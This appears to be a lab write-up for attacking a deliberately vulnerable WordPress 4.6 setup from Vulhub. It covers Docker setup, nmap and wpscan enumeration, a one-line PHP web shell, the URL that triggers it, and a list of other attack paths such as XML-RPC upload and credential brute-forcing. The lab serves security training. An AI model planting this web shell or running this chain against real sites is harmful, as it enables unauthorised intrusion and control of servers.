## 🟦 Wordpress-4.6-Remote-Code-Execution (RCE)

## 🟩 WordPress 4.6 RCE Lab

This lab demonstrates how Remote Code Execution (RCE) can be achieved in a **WordPress 4.6 environment** using a vulnerable setup from Vulhub.

⚠️ **Note:** The RCE is not due to WordPress core alone, but due to vulnerable components or insecure configurations in the lab.

---

## 🟢 Lab Setup (Vulhub)

### 🟣 Clone Repository

```bash
cd /opt
```

```bash
git clone https://github.com/vulhub/vulhub.git
```

```bash
cd vulhub/wordpress/pwnscriptum
```

---

### 🟣 Start Environment

```bash
docker compose up -d
```

```bash
netstat -nltup | grep 8080
```

---

### 🟣 Access Application

```
http://<TARGET-IP>:8080
```

## 🟢 Enumeration

### 🟣 Nmap Scan

```bash
nmap -sV -p 8080 <TARGET-IP>
```

```bash
nmap -v -sT -sV -sC -A -O -p 8080 192.168.1.103
```

---

### 🟣 WPScan

```bash
wpscan --url http://<TARGET-IP>:8080 \
--enumerate ap,at,cb,dbe \
--plugins-detection aggressive
```

```bash
wpscan --url http://192.168.1.103:8080 --enumerate ap,at,cb,dbe --plugins-detection aggressive
```

## 🟠 Expected Findings

- WordPress version: **4.6**
- Installed plugins/themes
- Potential misconfigurations
- Exposed directories or backup files

---

## 🟢 Exploitation Concept

Typical attack chain:

1. Identify vulnerable plugin or feature
2. Upload malicious payload (web shell)
3. Execute commands remotely

---

## 🟣 Web Shell Payload

```php
<?php system($_GET['cmd']); ?>
```

---

## 🟢 Upload Vectors

Possible upload methods:

- Media upload abuse
- Vulnerable plugin functionality
- Theme editor (requires admin access)

---

## 🟢 Trigger RCE

```
http://<TARGET-IP>:8080/wp-content/uploads/shell.php?cmd=id
```

---

## 🟢 Alternative Attack Paths

- XML-RPC abuse (wp.uploadFile)
- Brute-force admin credentials → Theme Editor RCE
- Local File Inclusion (LFI)
- Backup/config file exposure

## 🟢 Key Takeaways
